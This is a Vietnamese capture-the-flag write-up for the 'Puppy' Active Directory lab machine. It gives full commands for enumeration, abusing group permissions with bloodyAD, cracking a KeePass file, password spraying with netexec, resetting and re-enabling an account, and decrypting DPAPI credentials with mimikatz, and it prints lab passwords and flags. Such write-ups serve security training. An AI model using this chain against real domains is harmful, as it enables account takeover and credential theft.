![image](https://hackmd.io/_uploads/H1MU2vJRxx.png)

# Machine info 
Puppy là máy có một SMB share không dùng cấu hình mặc định tên là `DEV`. Với credential được cung cấp cho account `levi.james`, việc enumeration hệ thống tên miền có thể thực hiện được. Quá trình cho thấy account này có quyền `GenericWrite` trên nhóm `Developers`. Sau khi thêm `levi` vào nhóm này, ta có thể truy cập tới share `DEV` trước đó không thể truy cập. Share này chứa backup của một cơ sở dữ liệu **KeePass**. Cơ sở dữ liệu tiết lộ rất nhiều credential. Tấn công password spray cho thấy một trong những pass đó hợp lệ cho account `ant.edwards`. Hơn nữa, user này có quyền `GenericAll` đối với account `adam.silver` cho phép đổi pass của Adam thành pass do ta chọn. Sau khi pass đổi, ta phải re-enable account Adam vì account này đã bị vô hiệu hóa, việc kích hoạt lại cho phép ta remote qua WinRM. Lateral movement được thực hiện bằng cách tìm backup của một website, trong đó chứa credential `steph.cooper`. Cuối cùng, nâng quyền thông qua các thông tin xác thực **DPAPI** được giải mã bằng pass của `steph`. Credential tiết lộ thuộc về `steph.cooper_adm` là account admin của Steph 

# Recon
## nmap
```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -n -sS 10.129.10.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 03:27 EDT
Nmap scan report for 10.129.10.180
Host is up (0.22s latency).
Not shown: 986 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
111/tcp  open  rpcbind
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
2049/tcp open  nfs
3260/tcp open  iscsi
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl

┌──(kali㉿kali)-[~]
└─$ sudo nmap -p53,88,111,135,139,389,445,464,593,636,2049,3260,3268,3269 -sCV 10.129.10.180
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-10-17 03:29 EDT
Nmap scan report for 10.129.10.180
Host is up (0.20s latency).

Bug in iscsi-info: no string output.
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-10-17 14:29:41Z)
111/tcp  open  rpcbind?
|_rpcinfo: ERROR: Script execution failed (use -d to debug)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
2049/tcp open  mountd        1-3 (RPC #100005)
3260/tcp open  iscsi?
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: PUPPY.HTB0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2025-10-17T14:31:43
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 176.60 seconds
```
Add domain từ output vào `/etc/hosts`
```
echo "10.129.10.180 puppy.htb" | sudo tee -a /etc/hosts
```

## smbclient
Với credential được cấp ta sẽ dùng `smbclient` để xem các share trên target
```
┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.129.10.180 -U levi.james --password=KingofAkron2025!

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        DEV             Disk      DEV-SHARE for PUPPY-DEVS
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
```

Từ output thấy có một SMB share không phải mặc định tên là `DEV`. Tiếp tục vào folder này tuy nhiên đã bị deny

![image](https://hackmd.io/_uploads/SJS0GuJAgg.png)

## Bloodhound 
Để xem relation của các users ta sẽ dùng `bloodhound`
```
┌──(kali㉿kali)-[~/Desktop]
└─$ bloodhound-python -u levi.james -p 'KingofAkron2025!' -ns 10.129.10.180 -d 10.129.10.180 -d puppy.htb -c all --zip
```
![image](https://hackmd.io/_uploads/Hyj0HdkRll.png)

Sử dùng option `Cypher` để tìm đờng đến domain admin và thấy được có 2 khả năng có thể khai thác từ `users` và user `steph.cooper_adm`

![image](https://hackmd.io/_uploads/Ske7EoyReg.png)

# User flag
## Generic Write permission 
Tiến hành kiểm tra user hiện tại. Kết quả từ output cho thấy `james` thuộc `HR group` và group này có quyền `GenericWrite` lên `DEVELOPERS group`

![image](https://hackmd.io/_uploads/SkjnTYy0ll.png)

> GenericWrite có quyền với User account (Đặt lại scriptPath hoặc logonScript để thực thi mã khi user đăng nhập), Service account(Thêm hoặc chỉnh servicePrincipalName (SPN) để thực hiện Kerberoasting), Group object (Thêm chính mình vào nhóm quyền cao bằng cách ghi vào member hoặc memberOf)

### Get DEVELOPERS group 
Từ đây thì ta hoàn toàn join được vào `DEVELOPERS group`
```
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.10.180 -d puppy.htb -u levi.james -p 'KingofAkron2025!' add groupMember "DEVELOPERS" "levi.james"
```

Bây giờ ta đã có thể vào folder `DEV`

![image](https://hackmd.io/_uploads/SJboJqyAxl.png)

## Crack file recovery
File đáng chú ý sau khi `ls` là `recovery.kdbx`. Ta sẽ tiến hành crack file này bằng `keepass4brute.sh`
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ./keepass4brute.sh /home/kali/recovery.kdbx /usr/share/wordlists/rockyou.txt
```

![image](https://hackmd.io/_uploads/BJo7Nc1All.png)

![image](https://hackmd.io/_uploads/BypvV5k0le.png)

## Password spraying to get another account
Sau khi có password, ta cần tìm đúng username để truy cập. Sử dụng `netexec` với lệnh dưới để có list username mà user `levi.james` có thể lấy được
```
┌──(kali㉿kali)-[~]
└─$ netexec smb puppy.htb -u levi.james -p 'KingofAkron2025!' --rid-brute | grep -iE 'SidTypeUser' | grep -viE 'WINDOWS|\$' | awk '{print $6}' | awk -F'\\' '{print $2}' | tee usernames.txt
```

![image](https://hackmd.io/_uploads/HkeU_5k0gg.png)

Thực hiện password spraying
```
┌──(kali㉿kali)-[~]
└─$ netexec smb puppy.htb -u usernames.txt -p passwords.txt --continue-on-success
```

![image](https://hackmd.io/_uploads/SkCUF5yAee.png)

Vậy là ta có credential `ant.edwards:Antman2025!`. Thử với `winrm` nhưng không thành công

## GenericAll permission
Quay lại `bloodhound`, vào outbound với `ant.edwards` thấy được user này thuộc `SENIOR DEVS group`, mà `SENIOR DEVS group` lại có quyền `GenericAll` trên user `adam.silver`

![image](https://hackmd.io/_uploads/HkCBjc10el.png)

> GenericAll trên một user object = toàn quyền lên user đó, thay đổi mọi thuộc tính, đặt lại mật khẩu, chỉnh membership, thay đổi DACL, disable/enable, xóa,...

Nghĩa là `ant.edwards` có thể lợi dụng đặc quyền của nhóm để thao tác trên tài khoản `adam.silver`

Tiến hành đổi mật khẩu `adam.silver` để dùng acc này
```
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.10.180 -d puppy.htb -u ant.edwards -p 'Antman2025!' set password 'adam.silver' 'vanld5@Vcs'

[+] Password changed successfully!
```
### Enable a disabled account
Sau đó sử dụng `evil-winrm` nhưng lại trả về lỗi authen

![image](https://hackmd.io/_uploads/Byg5p5k0eg.png)

Kiểm tra thì mới biết acc này đã bị disable

![image](https://hackmd.io/_uploads/B1reRc1Ale.png)

Do đó ta cần enable lại với `bloodyAD`
```
┌──(kali㉿kali)-[~]
└─$ bloodyAD --host 10.129.10.180 -d puppy.htb -u ant.edwards -p 'Antman2025!' remove uac 'adam.silver' -f ACCOUNTDISABLE

[-] ['ACCOUNTDISABLE'] property flags removed from adam.silver's userAccountControl
```

Chạy `evil-winrm` lại 

![image](https://hackmd.io/_uploads/BkNiRcJ0xg.png)

:::spoiler User flag
```
*Evil-WinRM* PS C:\Users\adam.silver\Desktop> type user.txt
9438ff2a2b6d2907fc546bb9e6924337
```
:::

# Root flag
## Backup file exposed config with credentials
Ở folder `Backups` ta thấy file zip, có vẻ như nó là của một website. Tải file về để phân tích

![image](https://hackmd.io/_uploads/SkgvQsyAlg.png)

Unzip file sau đó tìm đến file config tại `nms-auth-config.xml.bak`

![image](https://hackmd.io/_uploads/S1lEDsyAlg.png)

Từ ảnh trên ta có được credential của user `steph` và đây cũng chính là acc có thể leo lên admin như đã [phân tích ở Recon](#Bloodhound)

![image](https://hackmd.io/_uploads/S1p3Ss1Rxe.png)

## Abusing DPAPI to get credential admin account
Tìm tục tìm và phát hiện tại `C:\Users\steph.cooper\AppData\Local\Microsoft\Credentials` lưu trữ credential mà người dùng lưu lại được mã hóa bằng DPAPI

### DPAPI (Data Protection API)
**DPAPI (Data Protection API)** là một dịch vụ bảo vệ dữ liệu của Windows do Microsoft cung cấp. **DPAPI** sử dụng master keys để mã hóa dữ liệu nhạy cảm. Các khóa này được tạo từ hash password của người dùng và được lưu trữ mã hóa trong thư mục bảo vệ của hồ sơ người dùng (thường là dưới dạng tệp với GUID duy nhất). Các credentials được lưu trữ dưới dạng **blob** mã hóa trong một thư mục riêng

Trong AD, nó phụ thuộc vào lòng tin domain. Nếu kẻ tấn công kiểm soát một tài khoản, họ có thể lừa DC cung cấp key backup mà không cần mật khẩu gốc của người dùng

![image](https://hackmd.io/_uploads/BkcN73VRxe.png)

Sau đó vào `C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect` để lấy key decrypt (masterkey)

![image](https://hackmd.io/_uploads/SyXUznkCgx.png)

### mimikatz
Sau khi có 2 thông tin, tiếp theo ta sẽ phải làm masterkey ở dạng cleartext để decrypt credential. Ta sẽ sử dụng `mimikatz`

Đầu tiên là kiểm tra file blob để xác nhận lại nó chứa credential của `steph.cooper_adm`

```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> .\mimikatz.exe "dpapi::cred /in:C:\users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9" "exit"
```

![image](https://hackmd.io/_uploads/SyGOg3k0xg.png)

Sử dụng RPC để query DC và lấy bản backup masterkey của `steph.cooper` (dựa trên GUID). Vì acc bị xâm nhập thuộc domain, DC sẽ cung cấp key này ở dạng cleartext nếu yêu cầu hợp lệ
```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> .\mimikatz.exe "dpapi::masterkey /in:C:\users\steph.cooper\appdata\roaming\microsoft\protect\S-1-5-21-1487982659-1829050783-2281216199-1107\556a2412-1275-4ccf-b721-e6a0b4f90407 /rpc" "exit"
```
![image](https://hackmd.io/_uploads/HygjgnyAge.png)

Với masterkey đã được cleartext, ta áp dụng nó lên blob để decrypt toàn bộ
```
*Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Protect\S-1-5-21-1487982659-1829050783-2281216199-1107> .\mimikatz.exe "dpapi::cred /in:C:\users\steph.cooper\appdata\roaming\microsoft\credentials\C8D69EBE9A43E9DEBF6B5FBD48B521B9 /masterkey:d9a570722fbaf7149f9f9d691b0e137b7413c1414c452f9c77d6d8a8ed9efe3ecae990e047debe4ab8cc879e8ba99b31cdb7abad28408d8d9cbfdcaf319e9c84" "exit"
```
![image](https://hackmd.io/_uploads/B1W0gnJ0ex.png)

Nhảy sang `steph.cooper_adm` và lấy flag
```
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
f2fe7404bc58f83e077a2ef77370a93f
```

––––––––––––––––––––– Puppy has been Pwned! –––––––––––––––––––––

